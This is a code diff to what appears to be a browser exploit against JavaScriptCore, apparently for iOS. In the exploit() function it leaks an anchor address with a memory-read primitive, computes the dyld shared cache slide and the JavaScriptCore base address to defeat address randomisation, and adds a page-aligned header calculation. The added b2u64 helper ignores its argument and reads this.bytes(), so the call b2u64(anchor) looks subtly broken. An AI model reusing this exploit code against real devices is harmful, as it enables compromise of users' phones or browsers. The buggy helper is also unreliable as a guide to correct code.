@@ -17,13 +17,17 @@ var VM_PROT_COPY = 16
 function sleep(seconds){
     var waitUntil = new Date().getTime() + seconds*1000;
     while(new Date().getTime() < waitUntil) true;
-}
+};
 function GetErrorCount(){
 	return document.getElementsByClassName("error").length;
-}
-function b2u32(b){
+};
+function b2u32(b) {
     return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
-}
+};
+function b2u64() {
+        var b = this.bytes();
+        return (b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0;
+};
 function hexdump(buffer, blockSize, base) {
     blockSize = blockSize || 16;
     var lines = [];
@@ -485,7 +489,8 @@ function exploit(){
 	    var slide = Sub(v_tlb, vtab); 
 	    var anchor = memory.read_i64(v_tlb,0)
 	    log('[+] Anchor address is' + anchor.toString(16));
-	    
+	    log('lo of anchor ' + b2u32(anchor) + 'hi of anchor' + b2u64(anchor));
+	    var hdr = Sub(anchor,b2u32(anchor) & 0xfff);
 	    log('[+] That means that the dyld shared cache slide should be '+slide.toString(16));
 	    var base = Add(new Int64('0x1881BD000'), slide);
 	    log('[+] And thus the JavaScriptCore base is '+base.toString(16));
